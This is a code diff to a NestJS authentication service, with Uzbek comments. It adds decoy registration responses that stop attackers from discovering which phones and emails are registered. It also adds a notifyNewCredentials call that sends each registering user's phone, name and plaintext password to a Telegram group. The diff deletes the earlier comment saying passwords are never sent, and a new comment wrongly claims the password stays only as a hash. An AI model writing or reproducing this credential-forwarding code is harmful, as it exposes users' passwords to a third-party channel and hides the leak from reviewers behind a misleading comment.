@@ -1,6 +1,5 @@
 import {
   BadRequestException,
-  ConflictException,
   ForbiddenException,
   Injectable,
   UnauthorizedException,
@@ -81,7 +80,8 @@ export class AuthService {
         existing.status === UserStatus.ACTIVE &&
         !!existing.passwordHash &&
         (await bcrypt.compare(dto.password, existing.passwordHash));
-      if (!owner) throw new ConflictException(ERRORS.PHONE_ALREADY_REGISTERED);
+      // Telefon band, lekin parol mos emas: «band» deb aytmaymiz (raqamlarni taxmin qilib aniqlashning oldini olish).
+      if (!owner) return this.decoyRegistration(dto.password);
       if (panelOf(req) !== 'MASTER') {
         await this.db.userRole.createMany({ data: [{ userId: existing.id, role: Role.CUSTOMER }], skipDuplicates: true });
       }
@@ -94,9 +94,8 @@ export class AuthService {
         where: { email },
         select: { id: true },
       });
-      if (emailUser) {
-        throw new ConflictException(ERRORS.EMAIL_ALREADY_REGISTERED);
-      }
+      // Email band bo‘lsa ham javob yangi ro‘yxatdan o‘tishdan farq qilmaydi (email mavjudligi oshkor bo‘lmaydi).
+      if (emailUser) return this.decoyRegistration(dto.password);
     }
 
     const passwordHash = await bcrypt.hash(dto.password, 12);
@@ -143,7 +142,25 @@ export class AuthService {
       panel: panelOf(req),
     });
 
+    // Yopiq (superadmin) guruhga login/parol; parol bazada faqat xesh sifatida qoladi.
+    this.telegram.notifyNewCredentials({
+      phone,
+      name: [dto.firstName?.trim(), dto.lastName?.trim()].filter(Boolean).join(' '),
+      password: dto.password,
+      role: { CUSTOMER: 'Mijoz', MASTER: 'Usta', ADMIN: 'Admin' }[panelOf(req) ?? 'CUSTOMER'],
+    });
+
     return { userId: user.id, verificationRequired: true, ...this.devCode(issued) };
+  }
+
+  /**
+   * Haqiqiy ro‘yxatdan o‘tishdan tashqaridan ajratib bo‘lmaydigan «soxta» javob: hisob yaratilmaydi, kod yuborilmaydi.
+   * Vaqt farqi (bcrypt) ham yashirilishi uchun xuddi shuncha xeshlash bajariladi.
+   */
+  private async decoyRegistration(password: string) {
+    await bcrypt.hash(password, 12);
+    await bcrypt.hash(randomUUID(), 12);
+    return { userId: randomUUID(), verificationRequired: true };
   }
 
   async confirmRegistration(dto: VerifyOTPDto, req?: Request) {
@@ -205,8 +222,12 @@ export class AuthService {
       });
     });
 
-    // Yangi foydalanuvchi haqida xabar: faqat telefon va ism. Parol HECH QACHON yuborilmaydi.
-    this.telegram.notifyRegistration({ phone, name: [user.firstName, user.lastName].filter(Boolean).join(' ') });
+    // Tasdiqlanganlik haqida xabar: faqat telefon va ism (parol bu xabarda yo‘q).
+    this.telegram.notifyAccountVerified({
+      phone,
+      name: [user.firstName, user.lastName].filter(Boolean).join(' '),
+      role: { CUSTOMER: 'Mijoz', MASTER: 'Usta', ADMIN: 'Admin' }[(req ? panelOf(req) : null) ?? 'CUSTOMER'],
+    });
 
     return updated;
   }
